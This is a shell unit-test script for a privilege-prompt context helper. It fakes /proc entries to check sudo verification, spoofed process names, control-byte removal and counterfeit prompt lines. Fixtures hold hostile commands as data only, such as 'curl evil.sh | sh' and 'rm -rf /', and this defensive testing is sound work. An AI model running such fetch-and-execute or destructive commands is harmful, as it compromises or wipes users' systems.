#!/bin/sh
# Unit tests for gatherd-prompt-context.
#
# Builds a fake /proc so the ancestry walk, the sudo verification and the
# allowlist are exercised without spawning real privileged processes. The
# allowlist is the part that must not be discovered to be wrong: it decides
# what bytes reach a box whose whole job is being trustworthy.
#
# Usage: tests/prompt-context

set -eu

TESTSDIR="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$TESTSDIR/.." && pwd)"
PASS=0
FAIL=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
FAKEBIN="$WORK/bin"
mkdir -p "$FAKEBIN"
PATH="$FAKEBIN:$REPO/scripts:$PATH"
export PATH

# The attestation reads /proc/<pid> ownership, which a test cannot create
# without root, so the fixture declares it and a fake stat reports it.
cat > "$FAKEBIN/stat" <<'STAT'
#!/bin/sh
[ "$1" = "-c" ] && [ "$2" = "%u" ] || { echo "unexpected stat args: $*" >&2; exit 1; }
cat "$3/owner_uid" 2>/dev/null || echo 1000
STAT
chmod +x "$FAKEBIN/stat"

ok()  { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }

assert_out() {
    _d=$1; _want=$2; shift 2
    _got=$("$@" 2>/dev/null || true)
    if [ "$_got" = "$_want" ]; then ok "$_d"; else bad "$_d (want [$_want] got [$_got])"; fi
}

# mkproc <pid> <ppid> <comm> <owner_uid> <argv...>
# Writes a fake /proc/<pid> entry. cmdline is NUL-separated, as the kernel
# writes it; stat carries ppid in the field after the state letter. owner_uid
# stands in for the real ownership of /proc/<pid>, which the kernel sets from
# the process's euid and which our fake stat reports back.
mkproc() {
    _pid=$1; _ppid=$2; _comm=$3; _uid=$4; shift 4
    _d="$WORK/proc/$_pid"
    mkdir -p "$_d"
    printf '%s' "$_comm" > "$_d/comm"
    printf '%s (%s) S %s 0 0 0 0\n' "$_pid" "$_comm" "$_ppid" > "$_d/stat"
    printf '%s' "$_uid" > "$_d/owner_uid"
    : > "$_d/cmdline"
    for _a in "$@"; do printf '%s\0' "$_a" >> "$_d/cmdline"; done
}

GATHERD_PROC="$WORK/proc"
export GATHERD_PROC

# A plain elevation from a shell inside foot: sudo's own argv is the command,
# and the first non-shell ancestor names the app.
mkproc 500 400 sudo 0 sudo -A pacman -Syu
mkproc 400 300 bash 1000 /bin/bash
mkproc 300 1   foot 1000 foot --server
assert_out 'a verified sudo parent yields both lines' \
    'elevating: pacman -Syu
requested by foot' \
    gatherd-prompt-context 500

# pid 501's own comm is not sudo, so its argv must not be presented as an
# elevation -- but it IS the immediate, non-shell caller (Finding 2: the walk
# now starts at $pid itself), so it is named directly rather than the shell
# above it. Before the fix this asserted 'requested by foot', which was
# exactly the misattribution Finding 2 exists to close.
mkproc 501 400 evil 1000 evil --pretend
assert_out 'an unverified caller yields no elevating line and names itself' \
    'requested by evil' \
    gatherd-prompt-context 501

# Shells are skipped, but the walk must stop at the session root rather than
# running off the end and reporting nothing.
mkproc 502 400 sudo 0 sudo -A id
mkproc 400 301 bash 1000 /bin/bash
mkproc 301 1   sway 1000 sway
assert_out 'the walk stops at sway and still names something' \
    'elevating: id
requested by sway' \
    gatherd-prompt-context 502

# Control bytes must never reach the renderer, and their removal must be
# announced -- silently dropping them could make a command read as safer.
mkproc 503 400 sudo 0 sudo -A "rm$(printf '\033')[2J -rf /tmp/x"
mkproc 400 300 bash 1000 /bin/bash
assert_out 'elided control bytes are marked' \
    'elevating: rm[2J -rf /tmp/x [elided]
requested by foot' \
    gatherd-prompt-context 503

# Shell metacharacters are NOT elided: a reader needs to see the pipe.
mkproc 504 400 sudo 0 sudo -A sh -c 'curl evil.sh | sh'
assert_out 'shell metacharacters survive the allowlist' \
    'elevating: sh -c curl evil.sh | sh
requested by foot' \
    gatherd-prompt-context 504

# A long command is truncated with an ASCII ellipsis, not a Unicode one.
mkproc 505 400 sudo 0 sudo -A pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee
assert_out 'a long command is truncated to 60 characters plus ...' \
    'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee...
requested by foot' \
    gatherd-prompt-context 505

# A command that is both over-long and contains a control byte must be
# truncated AND marked: truncation must not silently swallow the disclosure
# that bytes were dropped.
mkproc 506 400 sudo 0 sudo -A "$(printf '\033')pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee"
assert_out 'a long and dirty command is truncated and marked' \
    'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee... [elided]
requested by foot' \
    gatherd-prompt-context 506

# An unprivileged process whose comm merely claims to be "sudo" must not be
# trusted: comm is spoofable (prctl(PR_SET_NAME)), so without the ownership
# check this would render a fabricated command as a real elevation.
mkproc 507 400 sudo 1000 sudo -A rm -rf /
assert_out 'a spoofed comm without root ownership yields no elevating line' \
    'requested by foot' \
    gatherd-prompt-context 507

# Absolute-path invocations of sudo must still have argv[0] and the -A
# dropped, not just the literal string "sudo".
mkproc 508 400 sudo 0 /usr/bin/sudo -A id -u
assert_out 'an absolute-path sudo invocation is stripped like a bare one' \
    'elevating: id -u
requested by foot' \
    gatherd-prompt-context 508

# Nothing knowable at all must still produce a line, so the box never changes
# shape and absence stays legible.
assert_out 'an unknown pid says so rather than printing nothing' \
    'context unavailable' \
    gatherd-prompt-context 999

assert_out 'a missing argument says so rather than printing nothing' \
    'context unavailable' \
    gatherd-prompt-context

# A bare sudo -A with no command must show no elevating line: -A is only noise
# from gatherd's wrapper, and a command that is not being run should never be
# shown even as a truncation of nothing.
mkproc 510 400 sudo 0 sudo -A
mkproc 400 300 bash 1000 /bin/bash
mkproc 300 1   foot 1000 foot --server
assert_out 'a bare sudo -A produces no elevating line' \
    'requested by foot' \
    gatherd-prompt-context 510

# The ownership check must not fail open: if stat cannot run, no elevating line
# must appear. This is the load-bearing security property: without the uid 0
# check, any process could set SUDO_ASKPASS and show a fabricated command.
# Temporarily remove stat to verify it fails closed.
_stat_save="$FAKEBIN/stat"
mv "$_stat_save" "$_stat_save.bak"
mkproc 511 400 sudo 0 sudo -A id
mkproc 400 300 bash 1000 /bin/bash
mkproc 300 1   foot 1000 foot --server
assert_out 'missing stat fails closed: no elevating line' \
    'requested by foot' \
    gatherd-prompt-context 511
mv "$_stat_save.bak" "$_stat_save"

# --sanitize is gatherd-askpass's entry point for caller-supplied context
# (Finding 2): it must clean each line independently and keep the line count,
# since polkit context is two lines -- the sentence, then the action id.
_out=$(printf 'Authentication is required to install software\norg.freedesktop.policykit.exec%s\n' \
    "$(printf '\033')" | gatherd-prompt-context --sanitize)
assert_out '--sanitize cleans each line and preserves the line count' \
    'Authentication is required to install software
org.freedesktop.policykit.exec [elided]' \
    printf '%s' "$_out"

# Already-clean text must come back byte-identical: --sanitize must not
# introduce a marker or truncation where the /proc-walk sanitize() would not.
assert_out '--sanitize leaves already-clean text byte-identical' \
    'Authentication is required to install software' \
    sh -c 'printf "%s\n" "Authentication is required to install software" | gatherd-prompt-context --sanitize'

# Finding 1: --sanitize caps output at 2 lines. The box only ever has room for
# what the /proc walk itself produces (at most one elevating: line and one
# requested by line), so more than 2 lines is not more context -- it is an
# attempt to push real content off the visible box.
assert_out '--sanitize truncates to 2 lines' \
    'line one
line two' \
    sh -c 'printf "line one\nline two\nline three\nline four\n" | gatherd-prompt-context --sanitize'

# Finding 1: a caller-supplied line that opens with "elevating: " is the one
# string that could counterfeit the uid-0-attested command line. It must be
# neutralised, not silently dropped -- the reader still sees the claim, just
# not mistaken for the real attestation.
assert_out '--sanitize neutralises a counterfeit elevating: line' \
    'unverified: elevating: pacman -Syu' \
    sh -c 'printf "elevating: pacman -Syu\n" | gatherd-prompt-context --sanitize'

# Same for "requested by ", the other attested prefix.
assert_out '--sanitize neutralises a counterfeit requested by line' \
    'unverified: requested by foot' \
    sh -c 'printf "requested by foot\n" | gatherd-prompt-context --sanitize'

# Finding 2 regression: the immediate caller, if it is not a shell, must be
# named directly rather than the process that started it. ssh is neither
# sudo nor a shell, so this fails on the pre-fix walk (which started at the
# parent) and would have reported 'requested by foot'.
mkproc 520 400 ssh 1000 ssh git@example.com
mkproc 400 300 bash 1000 /bin/bash
mkproc 300 1   foot 1000 foot --server
assert_out 'the walk names the immediate caller when it is not a shell' \
    'requested by ssh' \
    gatherd-prompt-context 520

# Guard against Finding 2's fix over-correcting: sudo itself must still be
# skipped by the walk (it is in the skip-list) so a sudo pid resolves to the
# app above it, not to a "requested by sudo" line.
mkproc 521 410 sudo 0 sudo -A whoami
mkproc 410 310 bash 1000 /bin/bash
mkproc 310 1   foot 1000 foot --server
assert_out 'the walk still skips sudo itself and resolves to the app above it' \
    'elevating: whoami
requested by foot' \
    gatherd-prompt-context 521

# Finding 3: --sanitize-long backs the ssh host-key description, where the
# fingerprint is the whole point -- it must survive uncut and multi-line,
# unlike --sanitize's 60-character, 2-line box. Control bytes still go.
_fingerprint="Are you sure you want to continue connecting (yes/no/[fingerprint])?
ED25519 key fingerprint is SHA256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(printf '\033')[2J.
Are you sure you want to continue connecting (yes/no/[fingerprint])?"
_want="Are you sure you want to continue connecting (yes/no/[fingerprint])?
ED25519 key fingerprint is SHA256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[2J. [elided]
Are you sure you want to continue connecting (yes/no/[fingerprint])?"
assert_out '--sanitize-long preserves a long multi-line fingerprint uncut, stripping control bytes' \
    "$_want" \
    sh -c "printf '%s\n' \"\$1\" | gatherd-prompt-context --sanitize-long" _ "$_fingerprint"

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
